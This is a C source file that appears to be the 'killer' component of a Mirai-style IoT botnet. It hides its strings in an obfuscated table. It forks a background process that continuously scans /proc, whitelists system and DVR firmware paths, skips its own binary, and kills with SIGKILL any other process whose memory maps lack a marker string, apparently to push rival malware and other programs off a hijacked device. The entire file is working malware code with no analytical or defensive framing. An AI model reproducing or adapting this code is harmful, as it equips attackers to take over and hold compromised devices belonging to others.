#define _GNU_SOURCE

#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <signal.h>
#include <dirent.h>

#include "../headers/includes.h"
#include "../headers/table.h"
#include "../headers/util.h"

int DirLocation;

char *LWL[12] = {
    "/usr",
    "/bin",
    "/sbin",
    "/lib",
    "/snap",
    "/system",
    "/edvr",
    "/compress/usr/",
    "/stainfo",
    "/ (deleted)",
    "/util",
    ".cgi"
};

void change_path(char *path, char *pid, char *newpath)
{
    sec_toggle(TABLE_KILLER_PROC);
    strcpy(path, sec_unwrap(TABLE_KILLER_PROC, NULL));  /* /proc/        */
    strcat(path, pid);                                  /* /proc/pid     */
    strcat(path, newpath);                              /* /proc/pid/exe */
    sec_toggle(TABLE_KILLER_PROC);
}

int check_linker_whitelist(char *path)
{
    size_t i = 0;

    for (i = 0; i < sizeof(LWL) / sizeof(LWL[0]); ++i) {
        if (_startswith(path, LWL[i]) == 0) 
            return 1;
    }
    return 0;
}

char *check_realpath(char *pid, char *path)
{
    sec_toggle(TABLE_KILLER_EXE);
    char exepath[256] = {0};
    change_path(exepath, pid, sec_unwrap(TABLE_KILLER_EXE, NULL)); /* /proc/pid/exe */
    sec_toggle(TABLE_KILLER_EXE);

    if (readlink(exepath, path, 256) == -1) /* finds the readlink of the exe */
    {
        return NULL;
    }

    if (_startswith(path, SelfPath) == 0)
    {
#ifdef DEBUGG
        printf("found myself lol: %s ?= %s\n", path, SelfPath);
#endif
        return NULL;
    }

    return path;
}

int Check_Linker(char *pid)
{
    sec_toggle(TABLE_KILLER_PROC);
    sec_toggle(TABLE_KILLER_MAPS);
    sec_toggle(POS_BUFFER_1);
    int fd = 0, found = 0;
    char path[256] = {0}, buf[256] = {0};
    strcpy(path, sec_unwrap(TABLE_KILLER_PROC, NULL));  /* /proc/         */
    strcat(path, pid);                                  /* /proc/pid      */
    strcat(path, sec_unwrap(TABLE_KILLER_MAPS, NULL));  /* /proc/pid/maps */

    if ((fd = open(path, O_RDONLY)) == -1)
        return -1;

    while (_fdgets(buf, 256, fd) != 0)
    {
        if (strstr(buf, sec_unwrap(POS_BUFFER_1, NULL)))
        {
            found = 1;
            break;
        }
    }
    sec_toggle(TABLE_KILLER_PROC);
    sec_toggle(TABLE_KILLER_MAPS);
    sec_toggle(POS_BUFFER_1);
    return (found == 0) ? 4 : 0;
}

void Killer_Set_Start(void)
{
    sec_toggle(TABLE_KILLER_PROC);
    DIR *dir;
    struct dirent *file;

    if ((dir = opendir(sec_unwrap(TABLE_KILLER_PROC, NULL))) == NULL)
        return;

    while ((file = readdir(dir)))
    {
        if (!_isdigit(file->d_name[0]))
            continue;

        DirLocation = telldir(dir);
#ifdef DEBUGG
        printf("Found the first pid: (%d) -> %s\n", DirLocation, file->d_name);
#endif
        break;
    }
    sec_toggle(TABLE_KILLER_PROC);
    closedir(dir);
}

void Killer_Linker(void)
{
    int ret, pid, times = 0;
    char realpath[256] = {0};
    struct dirent *file;
    DIR *dir;

    Killer_Pid = fork();
    if (Killer_Pid != 0)
        return;

    prctl(PR_SET_PDEATHSIG, SIGHUP);
    
    dir = NULL;
    Killer_Set_Start();

    while (1)
    {
        sec_toggle(TABLE_KILLER_PROC);
        
        dir = opendir(sec_unwrap(TABLE_KILLER_PROC, NULL));
        if (dir == NULL)
            return;

        sec_toggle(TABLE_KILLER_PROC);

        seekdir(dir, DirLocation - 1);
        while ((file = readdir(dir)))
        {
            if (_isdigit(*file->d_name) == 0)
                continue;

            memset(realpath, 0, 256);
            if (check_realpath(file->d_name, realpath) == NULL)
                continue;

            pid = atoi(file->d_name);
            if (check_linker_whitelist(realpath) == 1)
                continue;
            
            if ((ret = Check_Linker(file->d_name)) == 0)
                continue;

            //printf("Killing PID: (%d)Linker: %d -> %s\n\n", ret, pid, realpath);
            kill(pid, 9);
        }

        closedir(dir);
        dir = NULL;

        usleep(10000);
        if (times++ == 10)
        {
            Killer_Set_Start();
            times = 0;
        }
    }
    return;
}
